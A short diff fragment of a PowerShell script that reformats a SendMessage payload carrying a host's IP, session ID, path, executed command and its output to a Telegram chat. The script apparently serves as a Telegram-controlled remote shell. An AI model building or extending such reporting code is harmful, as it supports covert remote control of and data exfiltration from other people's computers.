@@ -106,7 +106,7 @@ function SendMessage($output, $cmd) {
     $MessageToSend = @{
         chat_id    = $telegram_id
         parse_mode = "MarkdownV2"
-        text       = "```````nIP: $ip`nSESSION ID: $sid`nPATH: [$path]`nCMD: $c`n`n$o`n``````"
+        text       = "``$sid```n```````nIP: $ip`nPATH: [$path]`nCMD: $c`n`n$o`n``````"
     } | ConvertTo-Json
 
     try {
